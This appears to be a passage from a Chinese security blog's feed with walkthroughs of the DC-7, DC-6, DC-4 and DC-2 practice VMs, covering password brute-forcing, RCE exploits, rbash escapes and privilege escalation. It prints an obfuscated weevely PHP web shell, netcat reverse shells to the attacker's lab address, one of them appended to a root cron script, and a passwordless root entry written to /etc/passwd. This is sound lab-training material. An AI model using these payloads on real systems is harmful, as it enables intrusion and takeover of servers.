&quot;Staff&quot;;    $conn = mysqli_connect($servername, $username, $password, $dbname);?&gt;</code></pre><p>在这个文件中可以看到账号密码，</p><p>使用ssh连接,并且能够连接成功</p><pre><code>ssh dc7user@192.168.10.196</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104113501353.png" alt="image-20220104113501353"></p><p>在这个目录下有两个文件，文件夹backups里面有<code>website.sql.gpg  website.tar.gz.gpg</code>这两个文件</p><p>经过百度了解到这两个是加密文件，没有利用的地方</p><p>再查看一下mbox,这里有许多长得差不多的邮件信息,发现是一个计划任务：自动备份数据库的执行情况，调用的脚本是&#x2F;opt&#x2F;scripts&#x2F;backups.sh，是root权限执行的。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104115113148.png" alt="image-20220104115113148"></p><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><p>进入&#x2F;opt&#x2F;scripts&#x2F;这个目录,查看backups.sh这个文件,内容如下：</p><pre><code>#!/bin/bashrm /home/dc7user/backups/*cd /var/www/html/drush sql-dump --result-file=/home/dc7user/backups/website.sqlcd ..tar -czf /home/dc7user/backups/website.tar.gz html/gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sqlgpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gzchown dc7user:dc7user /home/dc7user/backups/*rm /home/dc7user/backups/website.sqlrm /home/dc7user/backups/website.tar.gz</code></pre><p>在这里可以看到有两个比较少见的命令<code>drush</code>和<code>gpg</code></p><p>经过百度得知drush命令是drupal的一套shell脚本或bat脚本，这个可以用来修改网站的admin账号的密码</p><pre><code>drush user-password admin --password=&quot;123456&quot;</code></pre><p>这个命令要在&#x2F;var&#x2F;www&#x2F;html目录下才能执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104202027758.png" alt="image-20220104202027758"></p><p>修改了密码后，去登录</p><p>登录成功后</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203208177.png" alt="image-20220104203208177"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203232079.png" alt="image-20220104203232079"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203258438.png" alt="image-20220104203258438"></p><p>在这里可以写入网页，但是网页类型没有php模式</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104203620587.png" alt="image-20220104203620587"></p><p>这里需要自己安装插件,下载连接：</p><pre><code>https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</code></pre><p>下载完成后，点击<code>Extend-&gt;+ install new module</code>选择刚下载的文件进行安装</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104204357472.png" alt="image-20220104204357472"></p><p>安装完成后点击Extend往下拉，勾选并启用PHP Filter模块，点击install</p><p>完成后回到写入网页的页面，可以发现这里能写php代码了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104204924769.png" alt="image-20220104204924769"></p><p>用weevely生成一个木马</p><pre><code>weevely generate cmd shell.php</code></pre><ul><li><p>generate 代表生成木马</p></li><li><p>a 为木马连接时的密码</p></li><li><p>a.php 为木马的文件名</p></li></ul><p>将shell.php的内容复制到Body里，title随便写，点击save</p><pre><code class="php">&lt;?php$r=&#39;o.=$t&#123;$i&#125;^QE$k&#123;QE$j&#125;;&#125;QE&#125;rQEeturnQE $o;&#125;if (@preg_QEmaQEtch(&quot;/$kQEh(.+)QE$kf/&quot;,@QEfiQEle_get_conteQEQEnts(&quot;php://iQEQE&#39;;$z=str_replace(&#39;EJ&#39;,&#39;&#39;,&#39;EJcreEJateEJEJ_funcEJEJtion&#39;);$d=&#39;&#123;$QEc=strlQEeQEQEn($k);$l=strQElen($t);$QEo=QE&quot;&quot;;for($i=QE0;$i&lt;$lQE;QE)&#123;for($j=QE0;QE($j&lt;$c&amp;QE&amp;$i&lt;QE$l);$j++,$QEi++)&#123;$QE&#39;;$J=&#39;contQEents();QE@ob_enQEd_cleaQEn(QE);$r=@basQEe64_QEencode(@xQE(@gzcomQEprQEess($o),$kQE)QE);pQEriQEnt(&quot;$p$kh$r$kf&quot;);&#125;&#39;;$j=&#39;$k=&quot;QEdfff0aQE7f&quot;;$kh=&quot;QEa1aQE55c8c1a49&quot;QE;QE$kf=&quot;66c1QE9f6da452&quot;QE;$pQE=&quot;6nMQEW0DQEI50PmP4TH8&quot;;QEQEfunctioQEn x($t,$k)&#39;;$X=&#39;nput&quot;)QEQE,$m)QE==1) &#123;@obQE_start();@evaQEl(QE@gzunQEcompress(@x(@baQEse6QE4_decodeQEQE($m[1]),$k))QE);$o=@oQEQEb_get_&#39;;$G=str_replace(&#39;QE&#39;,&#39;&#39;,$j.$d.$r.$X.$J);$N=$z(&#39;&#39;,$G);$N();?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212119928.png" alt="image-20220104212119928"></p><p>得到木马地址<code>http://192.168.10.196/node/5</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212256254.png" alt="image-20220104212256254"></p><p>用接下来用weevely进行连接</p><pre><code>weevely http://192.168.10.196/node/5 cmd</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104212335214.png" alt="image-20220104212335214"></p><p>成功拿到shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>由上面可知，<code>/opt/scripts/backups.sh</code>脚本执行是root权限，所以只要把反弹shell命令写入该脚本即可得到root权限</p><pre><code>echo &#39;nc -e /bin/bash 192.168.10.128 1234&#39;&gt;&gt;/opt/scripts/backups.sh</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104213207189.png" alt="image-20220104213207189"></p><p>kali这边</p><pre><code>rlwrap nc -lvvp 1234</code></pre><p>写入成功，等待其自动执行</p><p>反弹shell成功，并拿到root权限</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104215415008.png" alt="image-20220104215415008"></p><pre><code>cd /rootcat theflag.txt</code></pre><p>拿到flag</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104215600625.png" alt="image-20220104215600625"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-6靶场练习</title>
      <link href="/2021/12/24/DC-6%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/24/DC-6%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-6靶场练习"><a href="#DC-6靶场练习" class="headerlink" title="DC-6靶场练习"></a>DC-6靶场练习</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali:192.168.10.128</p><p>dc-6: 192.168.10.174</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>nmap 192.168.10.0/24</code></pre><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224152919978.png" alt="image-20211224152919978" style="zoom:150%;" /><p>这里可以看到靶机已经开了22端口和80端口</p><p>再用下面命令查看是否还开着其他端口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224153405661.png" alt="image-20211224153405661"></p><p>打开web端，打开<code>http://192.168.10.174/</code>,发现网页会跳转到<code>http://wordy/</code>并且打不开</p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224153757108.png" alt="image-20211224153757108" style="zoom:80%;" /><p>修改hosts文件，在文件里面添加</p><pre><code>192.168.10.174 wordy</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154009380.png" alt="image-20211224154009380"></p><p>修改后保存，重新打开<code>http://wordy/</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154113236.png" alt="image-20211224154113236"></p><p>打开成功</p><p>这是个WordPress的站点，<code>WordPress 5.1.1</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154354895.png" alt="image-20211224154354895"></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre><code>dirb http://wordy/</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154743386.png" alt="image-20211224154743386"></p><p>找到了后台登录的目录</p><pre><code>http://wordy/wp-admin/</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224154933030.png" alt="image-20211224154933030"></p><h2 id="爆破后台账号密码"><a href="#爆破后台账号密码" class="headerlink" title="爆破后台账号密码"></a>爆破后台账号密码</h2><p>通过wpscan爆破后台用户名</p><pre><code>wpscan --url http://wordy/ -e u</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224170856976.png" alt="image-20211224170856976"></p><pre><code>admin mark graham sarah jens</code></pre><p>将其保存在user.txt中</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224173400687.png" alt="image-20211224173400687"></p><p>有密码，还需要密码</p><p>作者为了降低难度，在vulhub给出了提示:dc-6的字典是可以被筛检的，可以大大减少我们爆破的时间。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211224174546662.png" alt="image-20211224174546662"></p><pre><code>zcat /usr/share/wordlists/rockyou.txt.gz | grep k01 &gt; password.txt</code></pre><p>运行命令后得到的字典如下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225133149850.png" alt="image-20211225133149850"></p><p>然后就是爆破:</p><pre><code>wpscan --url http://wordy/ -P password.txt -U user.txt</code></pre><p>获得账号密码:   mark &#x2F; helpdesk01</p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225134221550.png" alt="image-20211225134221550" style="zoom:150%;" /><p>登录后台：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225134635757.png" alt="image-20211225134635757"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>来到后台后，发现插件activity monitor，并且它的功能是记录各用户的操作记录</p><p>盲猜这个插件存在漏洞</p><p>寻找这个插件的漏洞脚本，能找到说明真的是存在漏洞</p><pre><code>searchsploit activity monitor </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225204259319.png" alt="image-20211225204259319"></p><p>找到一个RCE的脚本，即第四条:</p><pre><code>WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2) | php/webapps/50110.py</code></pre><p>尝试利用这个脚本</p><p>先找到这个脚本的路径</p><pre><code>find / -name 50110.py</code></pre><p>得到路径</p><pre><code>/usr/share/exploitdb/exploits/php/webapps/50110.py</code></pre><p>执行脚本:</p><pre><code>python3 /usr/share/exploitdb/exploits/php/webapps/50110.py</code></pre><p>执行后需要输入目标ip地址和后台登录的账号密码，执行成功后会返回一个shell</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225204944700.png" alt="image-20211225204944700"></p><p>拿到shell后，进行反弹shell到kali</p><pre><code>kali：nc -lvvp 1234dc-6: nc -e /bin/bash 192.168.10.128 1234连接成功后改善一下交互交互界面kali: python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225205500667.png" alt="image-20211225205500667"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225205508943.png" alt="image-20211225205508943"></p><p>反弹shell成功后，就是寻找提权线索</p><p>来到home目录，在mark&#x2F;stuff中找到一个things-to-do.txt,内容如下：</p><pre><code>Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#39;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#39;s replacement</code></pre><p>在这里可以知道另一个用户的账号密码：</p><pre><code>graham  / GSo7isUM1D4</code></pre><p>切换用户</p><pre><code>su graham</code></pre><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225211453645.png" alt="image-20211225211453645" style="zoom: 200%;" /><p>然后在&#x2F;home&#x2F;jens中找到一个backups.sh,内容是</p><pre><code>#!/bin/bashtar -czf backups.tar.gz /var/www/html</code></pre><p>大概的意思是对web的文件进行打包备份</p><p>查看该用户能执行的操作</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225213635814.png" alt="image-20211225213635814"></p><p>可以看到该用户可以执行backups.sh</p><p>向backups.sh文件中写入”&#x2F;bin&#x2F;bash”，并以jens用户去执行该脚本</p><pre><code>echo &quot;/bin/bash&quot; &gt;&gt; backups.shsudo -u jens ./backups.sh</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225215649548.png" alt="image-20211225215649548"></p><p>执行成功后，切换到了jens用户</p><p>查看这个用户可以执行的操作</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225220346275.png" alt="image-20211225220346275"></p><p>该用户可以执行nmap,可以通过namp提权</p><pre><code>echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt;getShellsudo nmap --script=getShell</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225221642374.png" alt="image-20211225221642374"></p><p>提权成功，寻找flag,按照dc靶场的惯例，flag在root文件夹下</p><pre><code>cd /rootlscat theflag.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211225221826625.png" alt="image-20211225221826625"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-4靶场练习</title>
      <link href="/2021/12/21/DC-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/21/DC-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-4靶场练习"><a href="#DC-4靶场练习" class="headerlink" title="DC-4靶场练习"></a>DC-4靶场练习</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali:192.168.10.128</p><p>dc-4:192.168.10.191(未知)</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先探测主机，发现靶机dc-4</p><pre><code>nmap 192.168.10.0/24     </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221145649437.png" alt="image-20211221145649437"></p><p>靶机IP为192.168.10.191,开放了22和80端口</p><p>经过dc-2的教训，查看作者是否还隐藏了其他端口</p><pre><code>nmap -A -p 1-65535 192.168.10.191</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221150338413.png" alt="image-20211221150338413"></p><p>就两个开放的端口</p><p>打开web端，只有一个简单的登录界面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221150531843.png" alt="image-20211221150531843"></p><p>根据<code>Admin Information Systems Login</code>提示，这里是让我们用admin登录</p><h2 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h2><p>Username:admin,Password:随便填，点击Submit，用burpsuite抓包进行密码爆破</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151139798.png" alt="image-20211221151139798"></p><p>密码字典我随便用一个，经过一段时间，密码爆破出来了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151312035.png" alt="image-20211221151312035"></p><p>密码为happy</p><p>尝试登录：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151458491.png" alt="image-20211221151458491"></p><p>登录成功</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>登录成功后，点击Command ,发现这里是执行命令的页面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151713181.png" alt="image-20211221151713181"></p><p>用burpsuite进行抓包重放</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221151957608.png" alt="image-20211221151957608"></p><p>可以发现这里的命令，空格用<code>+</code>号代替了</p><p>尝试更改使用其他命令，看看这里能否执行:</p><p>这里我把命令改为了<code>id</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152213986.png" alt="image-20211221152213986"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152231154.png" alt="image-20211221152231154"></p><p>可以看到命令执行了</p><p>尝试反弹shell</p><pre><code>kali：nc -lvvp 1234</code></pre><p>http请求包处的命令改为：</p><pre><code>radio=nc+-e+/bin/bash+192.168.10.128+1234&amp;submit=Run</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152801725.png" alt="image-20211221152801725"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221152824248.png" alt="image-20211221152824248"></p><p>可以看到反弹shell成功</p><p>为了控制台好看一丢丢,输入下面的命令</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153039086.png" alt="image-20211221153039086"></p><h2 id="寻找有用的信息"><a href="#寻找有用的信息" class="headerlink" title="寻找有用的信息"></a>寻找有用的信息</h2><p>在&#x2F;home 目录下发现了charles  jim  sam这三个目录</p><p>但是只有jim目录有东西</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153534277.png" alt="image-20211221153534277"></p><p>在backups目录下看到了个old-password.bak,打开一看，是个密码字典</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154021780.png" alt="image-20211221154021780"></p><p>先保存下来，命名为old-password.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221153948338.png" alt="image-20211221153948338"></p><p>查看下一个文件</p><pre><code>cat mbox</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154236304.png" alt="image-20211221154236304"></p><p>发现没有权限</p><p>先不管它，看看test.sh</p><pre><code>cat test.sh</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221154428348.png" alt="image-20211221154428348"></p><p>没啥有用的信息，但是这好像是个提示</p><h2 id="对22端口下手"><a href="#对22端口下手" class="headerlink" title="对22端口下手"></a>对22端口下手</h2><p>我们还有个端口没有用到，22端口，ssh连接</p><p>连接条件是，需要用户名和密码。刚刚再&#x2F;home目录下的三个目录名charles  jim  sam，应该就是存在的用户名，只有jim文件夹下有东西，ssh连接使用的用户名可以确定用的是jim，密码应该用的是</p><p>old-password.bak中的其中一个</p><p>所以，这里用hydra对ssh的密码进行爆破</p><pre><code>hydra -l jim -P old-password.txt 192.168.10.191 ssh -v  </code></pre><blockquote><p>-l 指定用户名,</p><p>-P  指定密码字典</p><p>-v 现实详细的执行过程</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221160053255.png" alt="image-20211221160053255"></p><p>密码爆破出来了，为jibril04</p><p>ssh连接</p><pre><code>ssh jim@192.168.10.191密码：jibril04</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221183312896.png" alt="image-20211221183312896"></p><p>连接成功</p><p>查看mbox,发现是发给jim的一封邮件的一些描述</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221214637420.png" alt="image-20211221214637420"></p><p>去&#x2F;var&#x2F;mail查看邮件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221214809599.png" alt="image-20211221214809599"></p><p>在这可以看到有charles 的密码<code>^xHhA&amp;hvim0y</code></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>切换用户</p><pre><code>su charles</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221215116931.png" alt="image-20211221215116931"></p><p>切换成功！</p><p>尝试sudo提权</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221220600021.png" alt="image-20211221220600021"></p><p>发现该用户有一个root权限的命令:teehee</p><blockquote><p>teehee命令可以写入文件内容并不覆盖文件原有内容</p><p>使用teehee命令将一个无密码用户admin写入到&#x2F;etc&#x2F;passwd文件，并加入到root组中</p><p>格式:   </p><p>用户名:是否有密码保护(x即有保护):uid:gid:全称:home目录:&#x2F;bin&#x2F;bash</p></blockquote><p>用该命令提权</p><pre><code>echo &quot;hacker::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code></pre><p>追加并提权成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221222914878.png" alt="image-20211221222914878"></p><h2 id="找flag"><a href="#找flag" class="headerlink" title="找flag"></a>找flag</h2><p>按照dc-4之前的靶机，最后的flag都是在root文件夹下的</p><p>不出所料啊，在root文件夹下找到flag</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211221223627254.png" alt="image-20211221223627254"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2靶场练习</title>
      <link href="/2021/12/20/DC-2%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/20/DC-2%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-2靶场练习"><a href="#DC-2靶场练习" class="headerlink" title="DC-2靶场练习"></a>DC-2靶场练习</h1><h2 id="练习环境"><a href="#练习环境" class="headerlink" title="练习环境"></a>练习环境</h2><p>kali:192.168.10.128</p><p>靶机dc-2:192.168.10.184(假装不知道)</p><h2 id="练习开始"><a href="#练习开始" class="headerlink" title="练习开始"></a>练习开始</h2><p>先用nmap找一下靶机的IP和端口：</p><pre><code>nmap 192.168.10.0/24</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220141827545.png" alt="image-20211220141827545"></p><p>扫出靶机，IP：192.168.10.184</p><p>这里只发现开了个80端口，很可疑，有猫腻，换条命令试试：</p><pre><code>nmap -A -p 1-65535 192.168.10.184</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220142242781.png" alt="image-20211220142242781"></p><p>果然有猫腻：隐藏了ssh服务的7744端口</p><p>先去web端看看：<code>http://192.168.10.184</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220142637899.png" alt="image-20211220142637899"></p><p>它会自动跳转到dc-2,似乎被重定向了</p><p>修改一下hosts文件就行了</p><pre><code>vim /etc/hosts</code></pre><p>加上<code>192.168.10.184 dc-2</code> 保存即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143420812.png" alt="image-20211220143420812"></p><p>重新打开web端，成功打开网站</p><p>并发现flag</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143713228.png" alt="image-20211220143713228"></p><p>打开flag,得到：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220143819425.png" alt="image-20211220143819425"></p><p>这里似乎在暗示我用cewl这个工具</p><blockquote><p>cewl是一个ruby应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John the ripper工具里进行密码破解。cewl还有一个相关的命令行工具应用FAB，它使用相同的元数据提取技术从已下载的列表中创建作者&#x2F;创建者列表。</p></blockquote><pre><code>cewl http://dc-2 -w 1.txt</code></pre><p>得到字典：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220145059991.png" alt="image-20211220145059991"></p><p>这是密码字典，缺用户名</p><p>再查看一下CMS</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220145810241.png" alt="image-20211220145810241"></p><p>该网站的CMS为WordPress</p><p>可以使用wpscan</p><blockquote><p>WPScan 是 Kali Linux 默认自带的一款漏洞扫描工具，它采用 Ruby 编写，能够扫描 WordPress 网站中的多种安全漏洞，其中包括 WordPress 本身的漏洞、插件漏洞和主题漏洞。最新版本 WPScan 的数据库中包含超过 18000 种插件漏洞和 2600 种主题漏洞，并且支持最新版本的 WordPress。值得注意的是，它不仅能够扫描类似 robots.txt 这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p></blockquote><p>首次打开，我们可以先更新其漏洞库</p><pre><code>wpscan -updata</code></pre><p>扫描站点，枚举用户名</p><pre><code>wpscan --url http://dc-2/ -e u  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220151051089.png" alt="image-20211220151051089"></p><p>得到三个用户，保存在user.txt中</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220151536633.png" alt="image-20211220151536633"></p><p>下一步就是爆破</p><pre><code>wpscan --url http://dc-2 -U user.txt -P 1.txt  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220155104164.png" alt="image-20211220155104164"></p><p>两个用户的密码都出来了</p><ul><li><p>jerry &#x2F; adipiscing </p></li><li><p>tom &#x2F; parturient</p></li></ul><p>扫描目录：</p><pre><code>dirb http://192.168.10.184</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220155925923.png" alt="image-20211220155925923"></p><p>得到后台登录地址：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160036875.png" alt="image-20211220160036875"></p><p>用jerry &#x2F; adipiscing 登录一下</p><p>登录成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160359443.png" alt="image-20211220160359443"></p><p>找到flag2</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220160449145.png" alt="image-20211220160449145"></p><p>用tom &#x2F; parturient 登录，没发现什么有用的东西</p><p>根据flag2的提示</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161221589.png" alt="image-20211220161221589"></p><p>我想起了还有个端口没利用，7744端口，ssh服务</p><pre><code>ssh tom@192.168.10.184 -p 7744 </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161606583.png" alt="image-20211220161606583"></p><p>在目录下发现flag3.txt,但是查看不了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220161918062.png" alt="image-20211220161918062"></p><p>-rbash是受限制的命令，但是-rbash是可以绕过</p><p>用以下命令查询可用命令：</p><pre><code>compgen -c </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220164132234.png" alt="image-20211220164132234"></p><p>发现<code>vi</code>可以使用</p><pre><code>vi flag3.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220164303545.png" alt="image-20211220164303545"></p><p>”可怜的老汤姆总是追着杰瑞。 也许他应该为他造成的所有压力而苏醒“</p><p>这里似乎没有了思路，但是打靶机的还有一个重要步骤没有做，那就是提权</p><p>因为<code>vi</code>可以使用，那就用这个提权了,提权步骤如下</p><pre><code>vi flag3.txt:set shell=/bin/sh:shell</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180600050.png" alt="image-20211220180600050"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180634523.png" alt="image-20211220180634523"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220180658690.png" alt="image-20211220180658690"></p><p>到这里，只能说提权了，但没有完全提权，还是有些命令不能用</p><p><code>cd</code>是可以使用的，可以去其他目录看看</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181019773.png" alt="image-20211220181019773"></p><p>返回上一级目录，发现jerry和tom</p><p>在jerry里面找到了flag4.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181211673.png" alt="image-20211220181211673"></p><pre><code>vi flag4.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220181341437.png" alt="image-20211220181341437"></p><pre><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet.You still need to get the final flag (the only flag that really counts!!!).No hints here - you&#39;re on your own now.  :-)Go on - git outta here!!!!</code></pre><p>从<code>but you&#39;re not home yet.</code>可知，我们下一步要去到root目录</p><p>但是没有访问权限</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220182133205.png" alt="image-20211220182133205"></p><p>还需要进一步提权</p><p>用jerry的账号登录看看，有啥可以用的命令，结果登录不上</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220183011255.png" alt="image-20211220183011255"></p><p>只能回到tom的账号</p><p>现在主要是<code>rbash</code>限制了我们的操作，如果能绕过就好了</p><p>百度走一波，找到rbash的绕过方法，步骤如下：</p><p>在刚才的部分提权成功的基础上，在进行下面的命令</p><pre><code>export PATH=/usr/sbin:/usr/bin:/sbin:/bin  //配置环境变量，成功绕过shell</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220192344498.png" alt="image-20211220192344498"></p><p>这里已经绕过了rbash了,很多常用的命令可以用了</p><p>或者用这个方法:</p><pre><code>BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211220193814982.png" alt="image-20211220193814982"></p><h2 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h2><p>这里尝试用suid提权:利用拥有suid的文件执行命令，从而提升权限至root</p><p>先查看有哪些可以利用的命令：</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img 